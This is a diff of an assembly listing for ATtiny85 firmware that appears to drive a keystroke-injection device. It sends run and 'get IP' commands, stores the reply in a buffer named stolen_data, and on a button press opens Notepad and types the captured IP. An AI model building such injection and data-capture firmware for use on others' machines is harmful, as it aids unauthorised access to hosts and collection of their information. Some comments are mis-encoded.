+                 	__POINTW2FN _0x0,147
+000146 dfac      	RCALL _uart_print_flash
+                 ; 0000 0057 
+                 ; 0000 0058     // ??????? ????
+                 ; 0000 0059     for(i=0; i<35; i++) stolen_data[i] = 0;
+                +
+000147 e000     +LDI R16 , LOW ( 0 )
+000148 e010     +LDI R17 , HIGH ( 0 )
                  	__GETWRN 16,17,0
                  _0x29:
                 +
-0000c1 3200     +CPI R16 , LOW ( 32 )
-0000c2 e0e0     +LDI R30 , HIGH ( 32 )
-0000c3 071e     +CPC R17 , R30
-                 	__CPWRN 16,17,32
-0000c4 f424      	BRGE _0x2A
-0000c5 d056      	RCALL SUBOPT_0x3
+000149 3203     +CPI R16 , LOW ( 35 )
+00014a e0e0     +LDI R30 , HIGH ( 35 )
+00014b 071e     +CPC R17 , R30
+                 	__CPWRN 16,17,35
+00014c f424      	BRGE _0x2A
+00014d d05b      	RCALL SUBOPT_0x3
                 +
-0000c6 5f0f     +SUBI R16 , LOW ( - 1 )
-0000c7 4f1f     +SBCI R17 , HIGH ( - 1 )
+00014e 5f0f     +SUBI R16 , LOW ( - 1 )
+00014f 4f1f     +SBCI R17 , HIGH ( - 1 )
                  	__ADDWRN 16,17,1
-0000c8 cff8      	RJMP _0x29
+000150 cff8      	RJMP _0x29
                  _0x2A:
-                 ; 0000 0056 for(i=0; i<30; i++) {
+                 ; 0000 005C for(i=0; i<30; i++) {
                 +
-0000c9 e000     +LDI R16 , LOW ( 0 )
-0000ca e010     +LDI R17 , HIGH ( 0 )
+000151 e000     +LDI R16 , LOW ( 0 )
+000152 e010     +LDI R17 , HIGH ( 0 )
                  	__GETWRN 16,17,0
                  _0x2C:
                 +
-0000cb 310e     +CPI R16 , LOW ( 30 )
-0000cc e0e0     +LDI R30 , HIGH ( 30 )
-0000cd 071e     +CPC R17 , R30
+000153 310e     +CPI R16 , LOW ( 30 )
+000154 e0e0     +LDI R30 , HIGH ( 30 )
+000155 071e     +CPC R17 , R30
                  	__CPWRN 16,17,30
-0000ce f4a4      	BRGE _0x2D
-                 ; 0000 0057         char c = uart_rx();
-                 ; 0000 0058         if(c == '\n' || c == '\r') {
-0000cf 9721      	SBIW R28,1
+000156 f4a4      	BRGE _0x2D
+                 ; 0000 005D         char c = uart_rx();
+                 ; 0000 005E         if(c == '\n' || c == '\r') {
+000157 9721      	SBIW R28,1
                  ;	c -> Y+0
-0000d0 dfcb      	RCALL _uart_rx
-0000d1 83e8      	ST   Y,R30
-0000d2 81a8      	LD   R26,Y
-0000d3 30aa      	CPI  R26,LOW(0xA)
-0000d4 f011      	BREQ _0x2F
-0000d5 30ad      	CPI  R26,LOW(0xD)
-0000d6 f419      	BRNE _0x2E
+000158 dfba      	RCALL _uart_rx
+000159 83e8      	ST   Y,R30
+00015a 81a8      	LD   R26,Y
+00015b 30aa      	CPI  R26,LOW(0xA)
+00015c f011      	BREQ _0x2F
+00015d 30ad      	CPI  R26,LOW(0xD)
+00015e f419      	BRNE _0x2E
                  _0x2F:
-                 ; 0000 0059             stolen_data[i] = 0;
-0000d7 d044      	RCALL SUBOPT_0x3
-                 ; 0000 005A             break;
-0000d8 9621      	ADIW R28,1
-0000d9 c009      	RJMP _0x2D
-                 ; 0000 005B         }
-                 ; 0000 005C         stolen_data[i] = c;
+                 ; 0000 005F             stolen_data[i] = 0;
+00015f d049      	RCALL SUBOPT_0x3
+                 ; 0000 0060             break;
+000160 9621      	ADIW R28,1
+000161 c009      	RJMP _0x2D
+                 ; 0000 0061         }
+                 ; 0000 0062         stolen_data[i] = c;
                  _0x2E:
-0000da 01f8      	MOVW R30,R16
-0000db 52e0      	SUBI R30,LOW(-_stolen_data)
-0000dc 4fff      	SBCI R31,HIGH(-_stolen_data)
-0000dd 81a8      	LD   R26,Y
-0000de 83a0      	STD  Z+0,R26
-                 ; 0000 005D     }
-0000df 9621      	ADIW R28,1
+000162 01f8      	MOVW R30,R16
+000163 52e0      	SUBI R30,LOW(-_stolen_data)
+000164 4fff      	SBCI R31,HIGH(-_stolen_data)
+000165 81a8      	LD   R26,Y
+000166 83a0      	STD  Z+0,R26
+                 ; 0000 0063     }
+000167 9621      	ADIW R28,1
                 +
-0000e0 5f0f     +SUBI R16 , LOW ( - 1 )
-0000e1 4f1f     +SBCI R17 , HIGH ( - 1 )
+000168 5f0f     +SUBI R16 , LOW ( - 1 )
+000169 4f1f     +SBCI R17 , HIGH ( - 1 )
                  	__ADDWRN 16,17,1
-0000e2 cfe8      	RJMP _0x2C
+00016a cfe8      	RJMP _0x2C
                  _0x2D:
-                 ; 0000 005E 
-                 ; 0000 005F     // --- ›«“ 2: œò„Â ---
-                 ; 0000 0060     while (1) {
-                 _0x31:
-                 ; 0000 0061         if (BTN_PIN == 0) {
-0000e3 99b4      	SBIC 0x16,4
-0000e4 c01a      	RJMP _0x34
-                 ; 0000 0062             delay_ms(50);
-0000e5 e3a2      	LDI  R26,LOW(50)
-0000e6 e0b0      	LDI  R27,0
-0000e7 d03b      	RCALL _delay_ms
-                 ; 0000 0063             if (BTN_PIN == 0) {
-0000e8 99b4      	SBIC 0x16,4
-0000e9 c015      	RJMP _0x35
-                 ; 0000 0064                 // »«“ ò—œ‰ ‰Ê  Åœ
-                 ; 0000 0065                 uart_print_flash(CMD_RUN);
-0000ea e1ae      	LDI  R26,LOW(_CMD_RUN*2)
-0000eb e0b0      	LDI  R27,HIGH(_CMD_RUN*2)
-0000ec df9d      	RCALL _uart_print_flash
-                 ; 0000 0066                 delay_ms(500);
-0000ed efa4      	LDI  R26,LOW(500)
-0000ee e0b1      	LDI  R27,HIGH(500)
-0000ef d033      	RCALL _delay_ms
-                 ; 0000 0067                 uart_print_flash("TYPE:notepad\n");
+                 ; 0000 0064 
+                 ; 0000 0065     uart_print_flash("DEBUG: IP Saved. Entering Phase 2 (Loop).\n");
                 +
-0000f0 eaa2     +LDI R26 , LOW ( 2 * _0x0 + ( 0 ) )
-0000f1 e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 0 ) )
-                 	__POINTW2FN _0x0,0
-0000f2 df97      	RCALL _uart_print_flash
-                 ; 0000 0068                 delay_ms(100);
-0000f3 e6a4      	LDI  R26,LOW(100)
-0000f4 e0b0      	LDI  R27,0
-0000f5 d02d      	RCALL _delay_ms
-                 ; 0000 0069                 uart_print_flash(KEY_ENTER);
-0000f6 e8a4      	LDI  R26,LOW(_KEY_ENTER*2)
-0000f7 e0b0      	LDI  R27,HIGH(_KEY_ENTER*2)
-0000f8 df91      	RCALL _uart_print_flash
-                 ; 0000 006A                 delay_ms(1000);
-0000f9 d00c      	RCALL SUBOPT_0x1
-                 ; 0000 006B 
-                 ; 0000 006C                     // --- ›«“ 1: Õ„·Â ---
-                 ; 0000 006D     uart_print_flash(CMD_RUN);
-                 ; 0000 006E     delay_ms(500);
-                 ; 0000 006F     uart_print_flash(CMD_GET_IP);
-                 ; 0000 0070     delay_ms(500);
-                 ; 0000 0071     uart_print_flash(KEY_ENTER);
-                 ; 0000 0072 
-                 ; 0000 0073     // ***  €ÌÌ— „Â„: «›“«Ì‘ “„«‰ ’»— »Â 5 À«‰ÌÂ ***
-                 ; 0000 0074     // «Ì‰ »Â Å«Ê—‘· «Ã«“Â „ÌœÂœ ò«„· ·Êœ ‘Êœ Ê œ” Ê— —« «Ã—« ò‰œ
-                 ; 0000 0075     delay_ms(5000);
-0000fa e8a8      	LDI  R26,LOW(5000)
-0000fb e1b3      	LDI  R27,HIGH(5000)
-0000fc d01b      	RCALL SUBOPT_0x2
+00016b eda8     +LDI R26 , LOW ( 2 * _0x0 + ( 164 ) )
+00016c e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 164 ) )
+                 	__POINTW2FN _0x0,164
+00016d df85      	RCALL _uart_print_flash
+                 ; 0000 0066 
+                 ; 0000 0067     // --- ??? 2: ???? ?? ???? ???? ---
+                 ; 0000 0068     while (1) {
+                 _0x31:
+                 ; 0000 0069         // ?? ???? ???? (Active Low)
+                 ; 0000 006A         if (BTN_PIN == 0) {
+00016e 99b4      	SBIC 0x16,4
+00016f c02a      	RJMP _0x34
+                 ; 0000 006B             delay_ms(50); // ?????? ?????
+000170 e3a2      	LDI  R26,LOW(50)
+000171 e0b0      	LDI  R27,0
+000172 d03d      	RCALL _delay_ms
+                 ; 0000 006C             if (BTN_PIN == 0) {
+000173 99b4      	SBIC 0x16,4
+000174 c025      	RJMP _0x35
+                 ; 0000 006D                 // ???? ????? ??
+                 ; 0000 006E                 uart_print_flash("DEBUG:Button Pressed!\n");
+                +
+000175 e0a3     +LDI R26 , LOW ( 2 * _0x0 + ( 207 ) )
+000176 e0b1     +LDI R27 , HIGH ( 2 * _0x0 + ( 207 ) )
+                 	__POINTW2FN _0x0,207
+000177 d02c      	RCALL SUBOPT_0x2
+                 ; 0000 006F 
+                 ; 0000 0070                 // ??? ???? Notepad
+                 ; 0000 0071                 uart_print_flash(CMD_RUN);
+                 ; 0000 0072                 delay_ms(500);
+                 ; 0000 0073                 uart_print_flash("TYPE:notepad\n");
+                +
+000178 e1aa     +LDI R26 , LOW ( 2 * _0x0 + ( 230 ) )
+000179 e0b1     +LDI R27 , HIGH ( 2 * _0x0 + ( 230 ) )
+                 	__POINTW2FN _0x0,230
+00017a df78      	RCALL _uart_print_flash
+                 ; 0000 0074                 delay_ms(100);
+00017b e6a4      	LDI  R26,LOW(100)
+00017c e0b0      	LDI  R27,0
+00017d d032      	RCALL _delay_ms
+                 ; 0000 0075                 uart_print_flash(KEY_ENTER);
+00017e e2a8      	LDI  R26,LOW(_KEY_ENTER*2)
+00017f e0b0      	LDI  R27,HIGH(_KEY_ENTER*2)
+000180 df72      	RCALL _uart_print_flash
                  ; 0000 0076 
-                 ; 0000 0077     uart_print_flash(CMD_ASK_DATA);
+                 ; 0000 0077                 delay_ms(1000); // ??? ???? ??? ??? ??? ??
+000181 eea8      	LDI  R26,LOW(1000)
+000182 e0b3      	LDI  R27,HIGH(1000)
+000183 d02c      	RCALL _delay_ms
                  ; 0000 0078 
-                 ; 0000 0079                 while (BTN_PIN == 0);
+                 ; 0000 0079                 // ???? ????? ????? ???
+                 ; 0000 007A                 uart_print_flash("TYPE:Your IP is: ");
+                +
+000184 e2a8     +LDI R26 , LOW ( 2 * _0x0 + ( 244 ) )
+000185 e0b1     +LDI R27 , HIGH ( 2 * _0x0 + ( 244 ) )
+                 	__POINTW2FN _0x0,244
+000186 df6c      	RCALL _uart_print_flash
+                 ; 0000 007B                 uart_print_ram(stolen_data);
+000187 eea0      	LDI  R26,LOW(_stolen_data)
+000188 e0b0      	LDI  R27,HIGH(_stolen_data)
+000189 df7a      	RCALL _uart_print_ram
+                 ; 0000 007C                 uart_print_flash("\n");
+                +
+00018a e4ad     +LDI R26 , LOW ( 2 * _0x0 + ( 25 ) )
+00018b e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 25 ) )
+                 	__POINTW2FN _0x0,25
+00018c df66      	RCALL _uart_print_flash
+                 ; 0000 007D 
+                 ; 0000 007E                 uart_print_flash("DEBUG:Done Typing. Release Button.\n");
+                +
+00018d e3aa     +LDI R26 , LOW ( 2 * _0x0 + ( 262 ) )
+00018e e0b1     +LDI R27 , HIGH ( 2 * _0x0 + ( 262 ) )
+                 	__POINTW2FN _0x0,262
+00018f df63      	RCALL _uart_print_flash
+                 ; 0000 007F 
+                 ; 0000 0080                 // ?? ????? ?? ??? ??? ???? ??? ?????? ???? (??????? ?? ?????)
+                 ; 0000 0081                 while(BTN_PIN == 0) {
                  _0x36:
-0000fd 9bb4      	SBIS 0x16,4
-0000fe cffe      	RJMP _0x36
-                 ; 0000 007A             }
-                 ; 0000 007B         }
+000190 99b4      	SBIC 0x16,4
+000191 c004      	RJMP _0x38
+                 ; 0000 0082                     delay_ms(10);
+000192 e0aa      	LDI  R26,LOW(10)
+000193 e0b0      	LDI  R27,0
+000194 d01b      	RCALL _delay_ms
+                 ; 0000 0083                 }
+000195 cffa      	RJMP _0x36
+                 _0x38:
+                 ; 0000 0084 
+                 ; 0000 0085                 uart_print_flash("DEBUG:Button Released. Waiting...\n");
+                +
+000196 e5ae     +LDI R26 , LOW ( 2 * _0x0 + ( 298 ) )
+000197 e0b1     +LDI R27 , HIGH ( 2 * _0x0 + ( 298 ) )
+                 	__POINTW2FN _0x0,298
+000198 df5a      	RCALL _uart_print_flash
+                 ; 0000 0086                 delay_ms(500);
+000199 d007      	RCALL SUBOPT_0x1
+                 ; 0000 0087             }
+                 ; 0000 0088         }
                  _0x35:
-                 ; 0000 007C     }
+                 ; 0000 0089     }
                  _0x34:
-0000ff cfe3      	RJMP _0x31
-                 ; 0000 007D }
+00019a cfd3      	RJMP _0x31
+                 ; 0000 008A }
                  _0x39:
-000100 cfff      	RJMP _0x39
+00019b cfff      	RJMP _0x39
                  ; .FEND
                  
                  	.DSEG
                  _stolen_data:
-0000e0           	.BYTE 0x20
+0000e0           	.BYTE 0x23
                  
                  	.CSEG
                  ;OPTIMIZER ADDED SUBROUTINE, CALLED 6 TIMES, CODE SIZE REDUCTION:13 WORDS
                  SUBOPT_0x0:
                 +
-000101 ed80     +LDI R24 , LOW ( 208 )
-000102 e090     +LDI R25 , HIGH ( 208 )
+00019c ea80     +LDI R24 , LOW ( 416 )
+00019d e091     +LDI R25 , HIGH ( 416 )
                 +__DELAY_USW_LOOP :
-000103 9701     +SBIW R24 , 1
-000104 f7f1     +BRNE __DELAY_USW_LOOP
-                 	__DELAY_USW 208
-000105 9508      	RET
+00019e 9701     +SBIW R24 , 1
+00019f f7f1     +BRNE __DELAY_USW_LOOP
+                 	__DELAY_USW 416
+0001a0 9508      	RET
                  
-                 ;OPTIMIZER ADDED SUBROUTINE, CALLED 2 TIMES, CODE SIZE REDUCTION:15 WORDS
+                 ;OPTIMIZER ADDED SUBROUTINE, CALLED 5 TIMES, CODE SIZE REDUCTION:6 WORDS
                  SUBOPT_0x1:
-000106 eea8      	LDI  R26,LOW(1000)
-000107 e0b3      	LDI  R27,HIGH(1000)
-000108 d01a      	RCALL _delay_ms
-000109 e1ae      	LDI  R26,LOW(_CMD_RUN*2)
-00010a e0b0      	LDI  R27,HIGH(_CMD_RUN*2)
-00010b df7e      	RCALL _uart_print_flash
-00010c efa4      	LDI  R26,LOW(500)
-00010d e0b1      	LDI  R27,HIGH(500)
-00010e d014      	RCALL _delay_ms
-00010f e2a8      	LDI  R26,LOW(_CMD_GET_IP*2)
-000110 e0b0      	LDI  R27,HIGH(_CMD_GET_IP*2)
-000111 df78      	RCALL _uart_print_flash
-000112 efa4      	LDI  R26,LOW(500)
-000113 e0b1      	LDI  R27,HIGH(500)
-000114 d00e      	RCALL _delay_ms
-000115 e8a4      	LDI  R26,LOW(_KEY_ENTER*2)
-000116 e0b0      	LDI  R27,HIGH(_KEY_ENTER*2)
-000117 cf72      	RJMP _uart_print_flash
+0001a1 efa4      	LDI  R26,LOW(500)
+0001a2 e0b1      	LDI  R27,HIGH(500)
+0001a3 c00c      	RJMP _delay_ms
                  
-                 ;OPTIMIZER ADDED SUBROUTINE, CALLED 2 TIMES, CODE SIZE REDUCTION:1 WORDS
+                 ;OPTIMIZER ADDED SUBROUTINE, CALLED 2 TIMES, CODE SIZE REDUCTION:2 WORDS
                  SUBOPT_0x2:
-000118 d00a      	RCALL _delay_ms
-000119 e9a0      	LDI  R26,LOW(_CMD_ASK_DATA*2)
-00011a e0b0      	LDI  R27,HIGH(_CMD_ASK_DATA*2)
-00011b cf6e      	RJMP _uart_print_flash
+0001a4 df4e      	RCALL _uart_print_flash
+0001a5 e1ae      	LDI  R26,LOW(_CMD_RUN*2)
+0001a6 e0b0      	LDI  R27,HIGH(_CMD_RUN*2)
+0001a7 df4b      	RCALL _uart_print_flash
+0001a8 cff8      	RJMP SUBOPT_0x1
                  
                  ;OPTIMIZER ADDED SUBROUTINE, CALLED 2 TIMES, CODE SIZE REDUCTION:3 WORDS
                  SUBOPT_0x3:
-00011c eea0      	LDI  R26,LOW(_stolen_data)
-00011d e0b0      	LDI  R27,HIGH(_stolen_data)
-00011e 0fa0      	ADD  R26,R16
-00011f 1fb1      	ADC  R27,R17
-000120 e0e0      	LDI  R30,LOW(0)
-000121 93ec      	ST   X,R30
-000122 9508      	RET
+0001a9 eea0      	LDI  R26,LOW(_stolen_data)
+0001aa e0b0      	LDI  R27,HIGH(_stolen_data)
+0001ab 0fa0      	ADD  R26,R16
+0001ac 1fb1      	ADC  R27,R17
+0001ad e0e0      	LDI  R30,LOW(0)
+0001ae 93ec      	ST   X,R30
+0001af 9508      	RET
                  
                  
                  	.CSEG
                  _delay_ms:
-000123 9610      	adiw r26,0
-000124 f039      	breq __delay_ms1
+0001b0 9610      	adiw r26,0
+0001b1 f039      	breq __delay_ms1
                  __delay_ms0:
-000125 95a8      	wdr
+0001b2 95a8      	wdr
                 +
-000126 ed80     +LDI R24 , LOW ( 0x7D0 )
-000127 e097     +LDI R25 , HIGH ( 0x7D0 )
+0001b3 ed80     +LDI R24 , LOW ( 0x7D0 )
+0001b4 e097     +LDI R25 , HIGH ( 0x7D0 )
                 +__DELAY_USW_LOOP :
-000128 9701     +SBIW R24 , 1
-000129 f7f1     +BRNE __DELAY_USW_LOOP
+0001b5 9701     +SBIW R24 , 1
+0001b6 f7f1     +BRNE __DELAY_USW_LOOP
                  	__DELAY_USW 0x7D0
-00012a 9711      	sbiw r26,1
-00012b f7c9      	brne __delay_ms0
+0001b7 9711      	sbiw r26,1
+0001b8 f7c9      	brne __delay_ms0
                  __delay_ms1:
-00012c 9508      	ret
+0001b9 9508      	ret
                  
                  __SAVELOCR2:
-00012d 931a      	ST   -Y,R17
-00012e 930a      	ST   -Y,R16
-00012f 9508      	RET
+0001ba 931a      	ST   -Y,R17
+0001bb 930a      	ST   -Y,R16
+0001bc 9508      	RET
                  
                  ;END OF CODE MARKER
                  __END_OF_CODE:
@@ -1662,29 +1839,29 @@ ATtiny85 register use summary:
 r0 :   0 r1 :   0 r2 :   0 r3 :   0 r4 :   0 r5 :   0 r6 :   0 r7 :   0 
 r8 :   0 r9 :   0 r10:   0 r11:   0 r12:   0 r13:   0 r14:   0 r15:   0 
 r16:  14 r17:  17 r18:   0 r19:   0 r20:   0 r21:   0 r22:   0 r23:   0 
-r24:  10 r25:   3 r26:  29 r27:  19 r28:   5 r29:   1 r30:  36 r31:   4 
-x  :   3 y  :  21 z  :   3 
+r24:  10 r25:   4 r26:  39 r27:  28 r28:   5 r29:   1 r30:  40 r31:   4 
+x  :   5 y  :  27 z  :   3 
 Registers used: 13 out of 35 (37.1%)
 
 ATtiny85 instruction use summary:
 .lds  :   0 .lds.l:   0 .sts  :   0 .sts.l:   0 adc   :   1 add   :   1 
 adiw  :   5 and   :   0 andi  :   1 asr   :   0 bclr  :   0 bld   :   0 
-brbc  :   0 brbs  :   0 brcc  :   0 brcs  :   0 break :   0 breq  :   4 
+brbc  :   0 brbs  :   0 brcc  :   0 brcs  :   0 break :   0 breq  :   5 
 brge  :   2 brhc  :   0 brhs  :   0 brid  :   0 brie  :   0 brlo  :   0 
 brlt  :   0 brmi  :   0 brne  :   7 brpl  :   0 brsh  :   2 brtc  :   0 
 brts  :   0 brvc  :   0 brvs  :   0 bset  :   0 bst   :   0 cbi   :   4 
 cbr   :   0 clc   :   0 clh   :   0 cli   :   1 cln   :   0 clr   :   2 
 cls   :   0 clt   :   0 clv   :   0 clz   :   0 com   :   0 cp    :   0 
-cpc   :   2 cpi   :   7 cpse  :   0 dec   :   2 des   :   0 eor   :   0 
+cpc   :   2 cpi   :   8 cpse  :   0 dec   :   1 des   :   0 eor   :   0 
 fmul  :   0 fmuls :   0 fmulsu:   0 icall :   0 ijmp  :   0 in    :   0 
-inc   :   0 ld    :   6 ldd   :   5 ldi   :  58 lds   :   0 lpm   :   4 
-lsl   :   0 lsr   :   2 mov   :   1 movw  :   1 mul   :   0 muls  :   0 
+inc   :   0 ld    :   9 ldd   :   6 ldi   :  71 lds   :   0 lpm   :   4 
+lsl   :   0 lsr   :   2 mov   :   2 movw  :   1 mul   :   0 muls  :   0 
 mulsu :   0 neg   :   0 nop   :   0 or    :   0 ori   :   1 out   :   7 
-pop   :   0 push  :   0 rcall :  27 ret   :   6 reti  :   0 rjmp  :  34 
-rol   :   0 ror   :   0 sbc   :   0 sbci  :   3 sbi   :   5 sbic  :   4 
-sbis  :   2 sbiw  :   6 sbr   :   0 sbrc  :   0 sbrs  :   0 sec   :   0 
+pop   :   0 push  :   0 rcall :  36 ret   :   6 reti  :   0 rjmp  :  37 
+rol   :   0 ror   :   0 sbc   :   0 sbci  :   3 sbi   :   5 sbic  :   5 
+sbis  :   1 sbiw  :   7 sbr   :   0 sbrc  :   0 sbrs  :   0 sec   :   0 
 seh   :   0 sei   :   0 sen   :   0 ser   :   0 ses   :   0 set   :   0 
-sev   :   0 sez   :   0 sleep :   0 spm   :   0 st    :  11 std   :   3 
+sev   :   0 sez   :   0 sleep :   0 spm   :   0 st    :  14 std   :   4 
 sts   :   0 sub   :   0 subi  :   5 swap  :   0 tst   :   0 wdr   :   1 
 
 Instructions used: 35 out of 114 (30.7%)
@@ -1692,8 +1869,8 @@ Instructions used: 35 out of 114 (30.7%)
 ATtiny85 memory use summary [bytes]:
 Segment   Begin    End      Code   Data   Used    Size   Use%
 ---------------------------------------------------------------
-[.cseg] 0x000000 0x000260    462    146    608    8192   7.4%
-[.dseg] 0x000060 0x000100      0     32     32     512   6.3%
+[.cseg] 0x000000 0x00037a    534    356    890    8192  10.9%
+[.dseg] 0x000060 0x000103      0     35     35     512   6.8%
 [.eseg] 0x000000 0x000000      0      0      0     512   0.0%
 
 Assembly complete, 0 errors, 3 warnings
